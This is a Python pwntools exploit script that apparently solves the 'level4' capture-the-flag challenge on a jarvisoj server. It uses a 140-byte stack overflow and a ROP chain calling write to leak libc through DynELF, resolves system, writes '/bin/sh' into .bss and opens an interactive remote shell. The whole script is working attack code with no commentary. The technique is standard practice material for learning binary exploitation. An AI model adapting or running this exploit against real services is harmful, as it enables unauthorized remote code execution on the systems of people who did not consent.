from pwn import *

elf = ELF('level4')
write = elf.symbols['write']
read = elf.symbols['read']
buf = elf.bss()
pop3_ret = 0x08048509

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

#p = process('level4')
#p = remote('127.0.0.1', 4000)
p = remote('pwn2.jarvisoj.com', 9880)

def leak(addr):
	payload = 'a'*140 + p32(write) + p32(0x0804844b) + p32(1) + p32(addr) + p32(4)
	p.sendline(payload)
	res = p.recv()[:4]
	print "leaking: %#x ---> %s" % (addr, res.encode('hex'))
	return res

d = DynELF(leak, elf=elf)
system = d.lookup('system', 'libc')
print "system addr: %#x" % system

payload = 'a'*140 + p32(read) + p32(pop3_ret) + p32(0) + p32(buf) + p32(0x10)
payload += p32(system) + p32(0x0804844b) + p32(buf)
p.sendline(payload)
sleep(1)
p.sendline('/bin/sh\x00')

#sleep(1)
#payload = 'a'*140 + p32(system) + p32(0x084844b) + p32(buf) + p32(0) + p32(0)
#p.sendline(payload) 

gdb.attach(p)

p.interactive()

